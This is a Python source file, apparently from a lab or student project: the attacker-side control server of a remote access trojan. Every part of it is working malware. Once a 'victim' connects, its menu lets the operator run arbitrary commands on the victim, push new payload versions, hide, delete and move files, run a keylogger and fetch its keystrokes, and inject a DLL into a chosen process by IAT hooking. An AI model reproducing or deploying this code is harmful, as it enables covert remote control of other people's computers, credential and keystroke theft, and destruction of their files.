#!/usr/bin/env python
import socket
from threading import Thread
import time
from SocketManager import SocketManager

# IAT_HOOKING_PROCESS_ID = 12152
# IAT_HOOKING_DLL = r"IAT Hooking\\IATHookingDLL.dll"
# KEY_LOGGER_FILE = r"keyLogger.txt"
# HIDDEN_FILE_PATH = r"C:\Users\admin\Desktop\hidden files.txt"
# DIR_TO_MOVE = r"C:\Users\admin\Desktop\New folder"
# FILE_TO_MOVE = r"C:\Users\admin\Desktop\hidden files.txt"
# FILE_PATH_TO_UPDATE = r"C:\Users\admin\Downloads\calc.exe"
# FILE_INFO_DIR = r"C:\Users\admin\Desktop\New folder"
# EXE_STR = "netstat -a -n -o"
# NEW_IP = "192.168.43.49"
# NEW_PORT = 4001
CHUNK_SIZE = 1024


def bin_file_to_buffer(file_path):
    """Lazy function (generator) to read a file piece by piece.
    Default chunk size: 1k."""
    try:
        with open(file_path, 'rb') as fp:
            while True:
                data = fp.read(CHUNK_SIZE)
                if not data:
                    break
                yield data
    except Exception as ex:
        print("Error opening file. Exception details: ", ex)


# def full_bin_file_to_buffer(file_path):
#     with open(file_path, 'rb') as fp:
#         data = fp.read()
#     return data

def update(conn):
    # UPDATE:
    SocketManager.send_data(conn, "UPDATE")
    file_path_to_update = input("Please enter the file path of the updated version\n")
    for chunk in bin_file_to_buffer(file_path_to_update):
        SocketManager.send_data(conn, chunk)

    SocketManager.send_data(conn, "END_UPDATE")


def execute(conn):
    # Execute
    SocketManager.send_data(conn, "EXECUTE")
    exe_command = input("Please enter a command to execute\n")
    SocketManager.send_data(conn, exe_command)

    data = SocketManager.receive(conn)
    if isinstance(data, bytes):
        print(data.decode())
    else:
        print(data)


def change_ip(conn):
    # Change IP
    while True:  # TODO: timeout or scheduler
        SocketManager.send_data(conn, "CHANGE_IP")
        new_ip = input("Please enter the new IP\n")
        valid_port = False
        new_port = 0
        while not valid_port:
            try:
                new_port = int(input("Please enter the new port\n"))
                valid_port = True
            except:
                print("Not a valid port!")

        packet_str = "%s:%s" % (new_ip, new_port)
        SocketManager.send_data(conn, packet_str)
        response_from_client = SocketManager.receive(conn)
        if response_from_client == 'accept':
            print(response_from_client)
            break
        else:
            print(response_from_client)


def file_system_info(conn):
    # file system info
    SocketManager.send_data(conn, "FILE_SYSTEM_INFO")
    file_info_dir = input("Please enter the directory you want to check\n")
    SocketManager.send_data(conn, file_info_dir)
    data = SocketManager.receive(conn)
    if isinstance(data, bytes):
        print(data.decode())
    else:
        print(data)


def show_hidden_file(conn):
    # show hidden file
    SocketManager.send_data(conn, "SHOW_HIDDEN_FILE")
    hidden_file_path = input("Please enter the hidden file path\n")
    SocketManager.send_data(conn, hidden_file_path)
    data = SocketManager.receive(conn)
    if isinstance(data, bytes):
        print(data.decode())
    else:
        print(data)


def hide_file(conn):
    # hide file
    SocketManager.send_data(conn, "HIDE_FILE")
    file_path_to_hide = input("Please enter the file path to hide\n")
    SocketManager.send_data(conn, file_path_to_hide)
    data = SocketManager.receive(conn)
    if isinstance(data, bytes):
        print(data.decode())
    else:
        print(data)


def delete_file(conn):
    # delete file
    SocketManager.send_data(conn, "DELETE_FILE")
    file_to_delete = input("Please enter the file path to delete\n")
    SocketManager.send_data(conn, file_to_delete)
    data = SocketManager.receive(conn)
    if isinstance(data, bytes):
        print(data.decode())
    else:
        print(data)


def move_file(conn):
    # move file to other directory
    SocketManager.send_data(conn, "MOVE_FILE")
    file_to_move = input("Please enter the file path to move\n")
    SocketManager.send_data(conn, file_to_move)
    dir_to_move = input("Please enter the directory to move to\n")
    SocketManager.send_data(conn, dir_to_move)
    data = SocketManager.receive(conn)
    if isinstance(data, bytes):
        print(data.decode())
    else:
        print(data)


def start_key_logger(conn, is_running_key_logger):
    # start key logger
    if is_running_key_logger:
        print("Key logger already running...")
        return False  # start didn't succeed
    SocketManager.send_data(conn, "START_KEY_LOGGER")
    return True  # start succeeded


def get_key_logger_data(conn, is_running_key_logger):
    # get key_logger_data
    if not is_running_key_logger:
        print("No key logger is running...")
        return

    SocketManager.send_data(conn, "GET_KEY_LOGGER_DATA")
    key_logger_data = SocketManager.receive(conn)
    try:
        key_logger_file = input("Please enter the path of the file you wish to save for key logger data\n")
        with open(key_logger_file, 'ab') as fp:
            fp.write(key_logger_data)

    except Exception as ex:
        print("Error openning file. Exception details: ", ex)


def stop_key_logger(conn, is_running_key_logger):
    # stop key logger
    if not is_running_key_logger:
        print("Currently, no key logger is running...")
        return False  # stop didn't succedd

    SocketManager.send_data(conn, "STOP_KEY_LOGGER")
    return True  # stop succeeded


def iat_hooking(conn):
    # IAT Hooking
    SocketManager.send_data(conn, "IAT_HOOKING")
    valid_process_id = False
    process_id = 0
    while not valid_process_id:
        try:
            process_id = int(input("Please enter the process id to hook\n"))
            valid_process_id = True
        except:
            print("Invalid process id!")

    SocketManager.send_data(conn, str(process_id))

    iat_hooking_dll = input("Please enter the dll file path to inject\n")
    for chunk in bin_file_to_buffer(iat_hooking_dll):
        SocketManager.send_data(conn, chunk)

    SocketManager.send_data(conn, "END_IAT_HOOKING")


if __name__ == '__main__':
    TCP_IP = '127.0.0.1'
    TCP_PORT = 5009
    is_running_key_logger = False

    print("Hello Attacker!\nYou are now listening on %s:%s" % (TCP_IP, TCP_PORT))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((TCP_IP, TCP_PORT))
    s.listen(1)

    conn, addr = s.accept()

    print("Victim Connected successfully. Connection address:", addr)


    data = SocketManager.receive(conn)
    if data:
        print('received data:', data)
        SocketManager.send_data(conn, data)
    while True:
        print("Enter your choice to attack your victim:")
        print("0: Update the version of the victim")
        print("1: Execute a command in the victim")
        print("2: Change the IP of the Attacker (Notice: You will not listen on this IP anymore!")
        print("3: Show file system information")
        print("4: Show an hidden file")
        print("5: Hide a file")
        print("6: Delete a file (only shown files will be deleted")
        print("7: Move a file to other directory")
        print("8: Start running key logger")
        print("9: Get key logger data to a file in your PC")
        print("10: Stop key logger")
        print("11: IAT hooking")

        try:
            choice = int(input())
        except:
            print("Invalid choice!")
            continue

        if choice == 0:
            update(conn)
        elif choice == 1:
            execute(conn)
        elif choice == 2:
            change_ip(conn)
        elif choice == 3:
            file_system_info(conn)
        elif choice == 4:
            show_hidden_file(conn)
        elif choice == 5:
            hide_file(conn)
        elif choice == 6:
            delete_file(conn)
        elif choice == 7:
            move_file(conn)
        elif choice == 8:
            result = start_key_logger(conn, is_running_key_logger)
            if result:
                is_running_key_logger = True
        elif choice == 9:
            get_key_logger_data(conn, is_running_key_logger)
        elif choice == 10:
            result = stop_key_logger(conn, is_running_key_logger)
            if result:
                is_running_key_logger = False
        elif choice == 11:
            iat_hooking(conn)
        else:
            print("Invalid choice!")

conn.close()
